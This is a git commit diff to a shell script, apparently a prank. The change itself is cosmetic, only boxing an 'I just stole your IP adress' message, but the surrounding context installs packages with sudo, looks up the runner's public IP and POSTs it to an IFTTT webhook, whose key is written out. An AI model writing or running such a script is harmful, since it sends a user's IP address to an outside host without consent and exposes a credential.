d3ad52628cf0425bdd98c1b679863defcb346a47
TheGreanestOfBeans <60801727+TheGreanestOfBeans@users.noreply.github.com>
2022-12-08 13:10:38 -0500

    Update main2.sh

--- main2.sh
+++ main2.sh
@@ -2,6 +2,6 @@
 
 sudo apt install boxes curl
 
-echo I just stole your IP adress
+echo I just stole your IP adress | boxes
 
 curl -X POST -H "Content-Type: application/json" -d $(curl -s https://api.ipify.org?format=json) https://maker.ifttt.com/trigger/ON_CONNECT/json/with/key/bS_UHKN2pJ317WZ2K3YBeK
